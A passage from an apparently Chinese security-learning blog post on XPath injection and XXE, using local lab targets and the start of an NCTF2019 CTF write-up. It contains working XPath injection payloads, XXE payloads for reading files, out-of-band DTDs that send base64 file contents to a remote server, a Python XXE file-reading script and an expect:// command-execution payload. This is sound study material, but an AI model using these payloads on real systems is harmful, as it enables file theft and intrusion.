        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span> 
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre>

<ul>
<li>Xpath.php</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test1.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$pwd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"/root/users/user[username/text()='"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password/text()='"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"']"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2>Welcome&lt;/h2>'</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />ID:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />Username:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>simplexml_load_file()</code>：返回类 SimpleXMLElement 的一个对象，该对象的属性包含 XML 文档中的数据</p>
<h3 id="正常查询"><a href="#正常查询" class="headerlink" title="正常查询"></a>正常查询</h3><img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210713155515319.png" class="" title="image-20210713155515319" loading="lazy">

<h3 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h3><blockquote>
<p>payload：&#x2F;?name&#x3D;’ or 1&#x3D;1 or ‘’ &#x3D; ‘</p>
</blockquote>
<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210713155854170.png" class="" title="image-20210713155854170" loading="lazy">

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="推测根节点数"><a href="#推测根节点数" class="headerlink" title="推测根节点数"></a>推测根节点数</h4><p>利用count(&#x2F;*)判断根下节点，?是可变量，有回显时说明存在?个节点</p>
<blockquote>
<p>payload：&#x2F;Xpath.php?name&#x3D;’ or count(&#x2F;*) &#x3D; <code>?</code> or ‘1’ &#x3D; ‘2&amp;pwd&#x3D;</p>
</blockquote>
<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210713160840886.png" class="" title="image-20210713160840886" loading="lazy">

<h4 id="盲注下一节点"><a href="#盲注下一节点" class="headerlink" title="盲注下一节点"></a>盲注下一节点</h4><p>利用substring分割每个字符，逐级猜解</p>
<blockquote>
<p>payload：url&#x2F;Xpath.php?name&#x3D;’ or substring(name(&#x2F;*[position() &#x3D; 1]),1,1) &#x3D; ‘r’ or ‘1’ &#x3D; ‘2&amp;pwd&#x3D;</p>
<p> url&#x2F;Xpath.php?name&#x3D;’ or substring(name(&#x2F;*[position() &#x3D; 1]),1,1) &#x3D; ‘o’ or ‘1’ &#x3D; ‘2&amp;pwd&#x3D;</p>
<p>…</p>
</blockquote>
<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210713161154452.png" class="" title="image-20210713161154452" loading="lazy">

<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>XXE漏洞全称XML External Entity Injection 即<strong>XML外部实体注入</strong>。</p>
<h2 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h2><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。</p>
<p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
<h2 id="要求-1"><a href="#要求-1" class="headerlink" title="要求"></a>要求</h2><p>XXE的造成与PHP版本无关，与libxml库的版本有关。</p>
<blockquote>
<p>libxml &lt;&#x3D; 2.9.0</p>
</blockquote>
<p>libxml &lt;&#x3D; 2.9.0中，默认启用了外部实体，libxml&gt;2.9.0中默认仅用了外部实体。</p>
<p>XXE并不是直接由libxml库造成的，libxml库提供了一些XML核心功能，包括禁用外部实体的libxml_disable_entity_loader()函数，SimpleXML库提供了解析XML的函数，SimpleXML库依赖于libxml库。</p>
<h2 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li><p>靶场：<a href="https://github.com/c0ny1/xxe-lab">xxe-lab</a></p>
</li>
<li><p>xxe.php</p>
</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xmlfile</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dom</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xxe</span><span class="token operator">=</span><span class="token variable">$xml</span><span class="token operator">-></span><span class="token property">xxe</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$xxe</span></span> \n"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<blockquote>
<p><code>file_get_contents</code>获取客户端输入内容</p>
<p><code>new DOMDocument()</code>初始化XML解析器</p>
<p><code>loadXML($xmlfile)</code>加载客户端输入的XML内容`</p>
<p><code>simplexml_import_dom($dom)</code>获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</p>
</blockquote>
<ul>
<li>获取<code>SimpleXMLElement</code>对象中的节点XXE，然后输出XXE内容。</li>
</ul>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;&#x2F;qwzf.txt&quot;&gt;
]&gt;
&lt;xml&gt;
&lt;xxe&gt;&amp;file;&lt;&#x2F;xxe&gt;
&lt;&#x2F;xml&gt;</code></pre>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>与SQL相似，XXE漏洞也分为有回显和无回显</p>
<ul>
<li>有回显，可以直接在页面中看到payload的执行结果或现象。</li>
<li>无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。</li>
</ul>
<h3 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h3><ul>
<li>xxe.php</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//注释掉该语句即为无回显的情况</span>
<span class="token delimiter important">?></span></span></code></pre>

<ul>
<li>payload</li>
</ul>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;1.txt&quot; &gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&amp;file;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;</code></pre>

<p>将payload进行url编码后传入</p>
<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210713175459430.png" class="" title="image-20210713175459430" loading="lazy">

<p>我这里没有读出文件，不知道是不是PHP版本太高了</p>
<ul>
<li>靶场练习</li>
</ul>
<h4 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h4><ul>
<li>源码</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
* autor: c0ny1
* date: 2018-2-7
*/</span>

<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>	
<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<ul>
<li>测试登录</li>
</ul>
<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210714133320096.png" class="" title="image-20210714133320096" loading="lazy">

<ul>
<li>任意文件读取</li>
</ul>
<p>payload：</p>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;xxe-labs&#x2F;php_xxe&#x2F;flag.txt&quot; &gt;
]&gt;
&lt;root&gt;
&lt;name&gt;&amp;file;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;</code></pre>

<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210714134106791.png" class="" title="image-20210714134106791" loading="lazy">

<h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><p>遇到无回显，可以通过<code>Blind XXE</code>方法加上外带数据通道来提取数据</p>
<p>先使用<code>php://filter</code>协议获取目标文件的内容，然后将内容以<code>http</code>请求发送到攻击服务器来读取数据。</p>
<p>虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器)。</p>
<ul>
<li><p>攻击流程</p>
<ol>
<li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>xxe.dtd</code>。</li>
<li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li>
<li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li>
</ol>
</li>
<li><p>源码</p>
</li>
</ul>
<p>修改一下，禁掉输出的报错信息</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
* autor: c0ny1
* date: 2018-2-7
*/</span>

<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>	
<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//echo $result;</span>
<span class="token delimiter important">?></span></span></code></pre>

<ul>
<li>部署dtd</li>
</ul>
<ol>
<li>payload</li>
</ol>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; ?&gt;
&lt;!DOCTYPE test[
&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;D:&#x2F;flag.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;172.17.10.2&#x2F;xxe.dtd&quot;&gt;
%dtd;
%send;
]&gt;</code></pre>

<p>或者</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; ?&gt;
&lt;!DOCTYPE root[
	&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;172.17.10.2&#x2F;xxe.dtd&quot;&gt;
	%dtd;
]&gt;</code></pre>

<ol start="2">
<li>部署远程xxe.dtd文件</li>
</ol>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;172.17.10.2&#x2F;?content&#x3D;%file;&#39;&gt;&quot;&gt; %payload;</code></pre>

<p>或者</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;D:&#x2F;flag.txt&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;172.17.10.2:5000&#x2F;?content&#x3D;%file;&#39;&gt;&quot;&gt;
%int;
%send;</code></pre>

<ol start="3">
<li>将xml进行url编码后传入，再查看远程服务器的Apache日志，解码后就是文件的内容</li>
</ol>
<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><ul>
<li>源码</li>
</ul>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<ul>
<li>脚本</li>
</ul>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token comment"># -*- coding:utf-8 -*-</span>
<span class="token keyword">import</span> urllib2

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">print</span> <span class="token string">u'输入要访问的地址，如http://127.0.0.1/xml/xxe2.php'</span>
    url <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    count<span class="token operator">=</span><span class="token number">1</span>
    <span class="token keyword">while</span> count<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">u'输入要读取的文件，如file:///etc/passwd'</span>
        payload <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-type'</span><span class="token punctuation">:</span> <span class="token string">'text/xml'</span><span class="token punctuation">&#125;</span>
        xml <span class="token operator">=</span> <span class="token string">'&lt;?xml version="1.0" encoding="utf-8"?>&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY xxe SYSTEM "'</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">'" >]>&lt;root>&lt;name>&amp;xxe;&lt;/name>&lt;/root>'</span>
        req <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> data <span class="token operator">=</span> xml<span class="token punctuation">)</span>
        res_data <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
        res <span class="token operator">=</span> res_data<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> res</code></pre>

<h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p>
<pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;</code></pre>

<p>通过XXE可以实现RCE的实例很少。</p>
<h4 id="例子：-NCTF2019-Fake-XML-cookbook"><a href="#例子：-NCTF2019-Fake-XML-cookbook" class="headerlink" title="例子：[NCTF2019]Fake XML cookbook"></a>例子：[NCTF2019]Fake XML cookbook</h4><p>拿到题目第一反应是注入，结果没发现注入点</p>
<img src="/2021/08/05/XML%E5%AD%A6%E4%B9%A0/image-20210714155122139.png" class="" title="image-20210714155122139" loading="lazy">

<p>打开源码，发现了提示，结合题目，可以基本确定题目为xxe</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">'text/javascript'</span><span class="token operator">></span> 
<span class="token keyword">function</span> <span class="token function">doLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#username"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">var</span> password <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>username <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> password <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Please enter the username and password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">"&lt;user>&lt;username>"</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">"&lt;/username>&lt;password>"</span> <span class="token operator">+</span> password <span class="token operator">+</span> <span class="token string">"&lt;/password>&lt;/user>"</span><span class="token punctuation">;</span> 
    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
